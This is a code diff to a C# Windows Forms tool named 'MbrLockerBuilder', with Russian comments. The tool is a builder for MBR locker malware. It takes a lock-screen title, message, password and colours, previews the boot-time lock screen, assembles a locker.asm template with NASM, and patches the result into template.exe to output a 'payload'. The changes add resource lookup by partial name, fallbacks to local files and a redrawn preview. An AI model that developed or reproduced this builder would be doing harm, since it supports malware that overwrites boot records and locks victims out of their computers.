@@ -160,10 +160,10 @@ namespace MbrLockerBuilder
             y += 50;
 
             Label lblPreview = new Label();
-            lblPreview.Text = "ПРЕДПРОСМОТР:";
+            lblPreview.Text = "ПРЕДПРОСМОТР (режим MBR):";
             lblPreview.Left = leftLabel;
             lblPreview.Top = y;
-            lblPreview.Width = 150;
+            lblPreview.Width = 250;
             lblPreview.ForeColor = Color.FromArgb(0, 255, 100);
             lblPreview.Font = new Font("Consolas", 10, FontStyle.Bold);
             this.Controls.Add(lblPreview);
@@ -173,12 +173,12 @@ namespace MbrLockerBuilder
             this.previewBox.Left = leftControl;
             this.previewBox.Top = y;
             this.previewBox.Width = 640;
-            this.previewBox.Height = 200;
+            this.previewBox.Height = 240;
             this.previewBox.BackColor = Color.Black;
             this.previewBox.BorderStyle = BorderStyle.FixedSingle;
             this.previewBox.SizeMode = PictureBoxSizeMode.StretchImage;
             this.Controls.Add(this.previewBox);
-            y += 220;
+            y += 260;
 
             this.btnBuild = new Button();
             this.btnBuild.Text = "СОБРАТЬ PAYLOAD";
@@ -230,9 +230,18 @@ namespace MbrLockerBuilder
         {
             if (this.previewBox == null) return;
 
-            Bitmap bmp = new Bitmap(640, 200);
+            // Размеры в пикселях
+            int width = 640;
+            int height = 240;
+            int charWidth = 8;    // Ширина символа в пикселях
+            int charHeight = 12;  // Высота символа в пикселях
+            int charsPerLine = 80;
+            int linesPerScreen = 25;
+
+            Bitmap bmp = new Bitmap(width, height);
             using (Graphics g = Graphics.FromImage(bmp))
             {
+                // Фон
                 Color bgColor = Color.Black;
                 switch (this.cmbBgColor.SelectedIndex)
                 {
@@ -243,8 +252,10 @@ namespace MbrLockerBuilder
                 }
                 g.Clear(bgColor);
 
-                g.DrawRectangle(new Pen(Color.FromArgb(0, 255, 100), 2), 5, 5, 630, 190);
+                // Рисуем рамку (как в MBR)
+                g.DrawRectangle(new Pen(Color.FromArgb(80, 80, 80), 1), 5, 5, width - 10, height - 10);
 
+                // Цвет текста
                 Color fgColor = Color.Lime;
                 switch (this.cmbTextColor.SelectedIndex)
                 {
@@ -256,30 +267,53 @@ namespace MbrLockerBuilder
                     case 5: fgColor = Color.Magenta; break;
                 }
 
+                using (Font font = new Font("Consolas", 12, FontStyle.Regular))
                 using (Brush brush = new SolidBrush(fgColor))
                 {
+                    // Строки для вывода
                     string title = this.txtTitle.Text.Trim();
-                    if (string.IsNullOrEmpty(title)) title = "[LOCKED]";
-                    SizeF titleSize = g.MeasureString(title, new Font("Consolas", 16, FontStyle.Bold));
-                    g.DrawString(title, new Font("Consolas", 16, FontStyle.Bold), brush,
-                        (640 - titleSize.Width) / 2, 15);
-
-                    g.DrawLine(new Pen(fgColor, 1), 20, 45, 620, 45);
+                    if (string.IsNullOrEmpty(title)) title = "LOCKED";
 
                     string body = this.txtBody.Text.Trim();
                     if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
-                    string[] lines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
-                    int lineY = 60;
-                    foreach (string line in lines)
+
+                    string password = this.txtPassword.Text.Trim();
+                    if (string.IsNullOrEmpty(password)) password = "********";
+
+                    // --- Вывод как в MBR ---
+                    int x = 20;
+                    int y = 20;
+
+                    // Заголовок
+                    string titleLine = "[ " + title + " ]";
+                    g.DrawString(titleLine, font, brush, x, y);
+                    y += 25;
+
+                    // Разделитель
+                    g.DrawLine(new Pen(fgColor, 1), x, y, width - 20, y);
+                    y += 20;
+
+                    // Текст (разбиваем на строки)
+                    string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                    foreach (string line in bodyLines)
                     {
-                        g.DrawString(line.Trim(), new Font("Consolas", 10), brush, 20, lineY);
-                        lineY += 20;
+                        g.DrawString(line.Trim(), font, brush, x, y);
+                        y += 20;
                     }
 
-                    g.DrawString("Password: ", new Font("Consolas", 12, FontStyle.Bold), brush, 20, 165);
-                    string pass = this.txtPassword.Text;
-                    string stars = new string('*', Math.Min(pass.Length, 20));
-                    g.DrawString(stars, new Font("Consolas", 12, FontStyle.Bold), brush, 145, 165);
+                    // Промпт для пароля
+                    y += 10;
+                    g.DrawString("Password: ", font, brush, x, y);
+
+                    // Звёздочки пароля
+                    string stars = new string('*', Math.Min(password.Length, 25));
+                    SizeF starsSize = g.MeasureString(stars, font);
+                    g.DrawString(stars, font, brush, x + 100, y);
+
+                    // --- Дополнительные элементы ---
+                    // Мигающий курсор (имитация)
+                    y += 20;
+                    g.DrawString("█", font, new SolidBrush(Color.White), x + 100 + starsSize.Width + 2, y - 20);
                 }
             }
             this.previewBox.Image = bmp;
@@ -289,14 +323,36 @@ namespace MbrLockerBuilder
         {
             try
             {
-                this.lblStatus.Text = "1/6 Извлечение ресурсов...";
+                this.lblStatus.Text = "1/6 Поиск ресурсов...";
                 Application.DoEvents();
 
-                // Извлекаем NASM из ресурсов
-                string nasmPath = this.ExtractResource("MbrLockerBuilder.Resources.nasm.exe", "nasm.exe");
+                // --- ДИАГНОСТИКА: выводим все встроенные ресурсы ---
+                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+                string resourceList = "=== ВСТРОЕННЫЕ РЕСУРСЫ ===\n";
+                foreach (string name in allResources)
+                    resourceList += name + "\n";
+                resourceList += "===========================\n";
+                MessageBox.Show(resourceList, "Диагностика", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                // --- Ищем NASM ---
+                string nasmPath = FindResourceByPartialName("nasm", "nasm.exe");
                 if (string.IsNullOrEmpty(nasmPath))
                 {
-                    throw new Exception("Не удалось извлечь nasm.exe из ресурсов!");
+                    // Пробуем найти рядом с билдером
+                    string localNasm = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "nasm.exe");
+                    if (File.Exists(localNasm))
+                    {
+                        nasmPath = localNasm;
+                        this.lblStatus.Text = "NASM найден рядом с билдером";
+                    }
+                    else
+                    {
+                        throw new Exception("NASM не найден ни в ресурсах, ни рядом с билдером!");
+                    }
+                }
+                else
+                {
+                    this.lblStatus.Text = "NASM извлечён из ресурсов";
                 }
 
                 this.lblStatus.Text = "2/6 Генерация ASM...";
@@ -343,11 +399,24 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "6/6 Патчинг шаблона...";
                 Application.DoEvents();
 
-                // Извлекаем template.exe из ресурсов
-                byte[] templateBytes = this.ExtractResourceBytes("MbrLockerBuilder.Resources.template.exe");
+                // --- Ищем template.exe ---
+                byte[] templateBytes = FindResourceBytesByPartialName("template");
                 if (templateBytes == null)
                 {
-                    throw new Exception("Не удалось извлечь template.exe из ресурсов!");
+                    string localTemplate = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "template.exe");
+                    if (File.Exists(localTemplate))
+                    {
+                        templateBytes = File.ReadAllBytes(localTemplate);
+                        this.lblStatus.Text = "template.exe найден рядом с билдером";
+                    }
+                    else
+                    {
+                        throw new Exception("template.exe не найден ни в ресурсах, ни рядом с билдером!");
+                    }
+                }
+                else
+                {
+                    this.lblStatus.Text = "template.exe извлечён из ресурсов";
                 }
 
                 byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);
@@ -358,7 +427,7 @@ namespace MbrLockerBuilder
                 {
                     File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
                     this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
-                    
+
                     MessageBox.Show("Payload успешно создан!\n\n" +
                         "Размер: " + payloadBytes.Length + " байт\n" +
                         "Путь: " + this.saveFileDialog.FileName + "\n\n" +
@@ -372,7 +441,7 @@ namespace MbrLockerBuilder
 
                 try { File.Delete(asmPath); } catch { }
                 try { File.Delete(binPath); } catch { }
-                try { File.Delete(nasmPath); } catch { }
+                if (nasmPath.StartsWith(Path.GetTempPath())) { try { File.Delete(nasmPath); } catch { } }
             }
             catch (Exception ex)
             {
@@ -382,22 +451,41 @@ namespace MbrLockerBuilder
             }
         }
 
-        private string ExtractResource(string resourceName, string fileName)
+        // --- НОВЫЙ МЕТОД: поиск ресурса по части имени ---
+        private string FindResourceByPartialName(string partialName, string fileName)
         {
             try
             {
+                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+                string foundName = null;
+                foreach (string name in allResources)
+                {
+                    if (name.IndexOf(partialName, StringComparison.OrdinalIgnoreCase) >= 0)
+                    {
+                        foundName = name;
+                        break;
+                    }
+                }
+
+                if (string.IsNullOrEmpty(foundName))
+                {
+                    this.lblStatus.Text = "Ресурс с именем '" + partialName + "' не найден!";
+                    return null;
+                }
+
                 string tempPath = Path.Combine(Path.GetTempPath(), fileName);
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(foundName))
                 {
                     if (stream == null)
                     {
-                        throw new Exception($"Ресурс {resourceName} не найден!");
+                        throw new Exception($"Ресурс {foundName} не найден!");
                     }
                     using (FileStream fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
                     {
                         stream.CopyTo(fs);
                     }
                 }
+                this.lblStatus.Text = "Извлечён: " + foundName + " -> " + tempPath;
                 return tempPath;
             }
             catch (Exception ex)
@@ -407,15 +495,33 @@ namespace MbrLockerBuilder
             }
         }
 
-        private byte[] ExtractResourceBytes(string resourceName)
+        // --- НОВЫЙ МЕТОД: поиск ресурса в виде байтов по части имени ---
+        private byte[] FindResourceBytesByPartialName(string partialName)
         {
             try
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+                string foundName = null;
+                foreach (string name in allResources)
+                {
+                    if (name.IndexOf(partialName, StringComparison.OrdinalIgnoreCase) >= 0)
+                    {
+                        foundName = name;
+                        break;
+                    }
+                }
+
+                if (string.IsNullOrEmpty(foundName))
+                {
+                    this.lblStatus.Text = "Ресурс с именем '" + partialName + "' не найден!";
+                    return null;
+                }
+
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(foundName))
                 {
                     if (stream == null)
                     {
-                        throw new Exception($"Ресурс {resourceName} не найден!");
+                        throw new Exception($"Ресурс {foundName} не найден!");
                     }
                     using (MemoryStream ms = new MemoryStream())
                     {
@@ -442,12 +548,12 @@ namespace MbrLockerBuilder
             }
 
             byte[] result = new byte[templateBytes.Length - marker.Length + mbrHex.Length];
-            
+
             Array.Copy(templateBytes, 0, result, 0, markerPos);
-            
+
             byte[] hexBytes = Encoding.ASCII.GetBytes(mbrHex);
             Array.Copy(hexBytes, 0, result, markerPos, hexBytes.Length);
-            
+
             int afterMarker = markerPos + marker.Length;
             int remaining = templateBytes.Length - afterMarker;
             Array.Copy(templateBytes, afterMarker, result, markerPos + hexBytes.Length, remaining);
@@ -476,16 +582,47 @@ namespace MbrLockerBuilder
         private string GenerateAsmFromResource()
         {
             string template;
-            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.locker.asm"))
+
+            // Ищем locker.asm в ресурсах
+            string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+            string foundName = null;
+            foreach (string name in allResources)
             {
-                if (stream == null)
+                if (name.IndexOf("locker.asm", StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    foundName = name;
+                    break;
+                }
+            }
+
+            if (string.IsNullOrEmpty(foundName))
+            {
+                // Пробуем найти рядом с билдером
+                string localAsm = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker.asm");
+                if (File.Exists(localAsm))
+                {
+                    template = File.ReadAllText(localAsm);
+                    this.lblStatus.Text = "locker.asm найден рядом с билдером";
+                }
+                else
                 {
                     throw new Exception("Ресурс locker.asm не найден!");
                 }
-                using (StreamReader reader = new StreamReader(stream))
+            }
+            else
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(foundName))
                 {
-                    template = reader.ReadToEnd();
+                    if (stream == null)
+                    {
+                        throw new Exception($"Ресурс {foundName} не найден!");
+                    }
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        template = reader.ReadToEnd();
+                    }
                 }
+                this.lblStatus.Text = "locker.asm найден в ресурсах: " + foundName;
             }
 
             string title = this.txtTitle.Text.Trim();
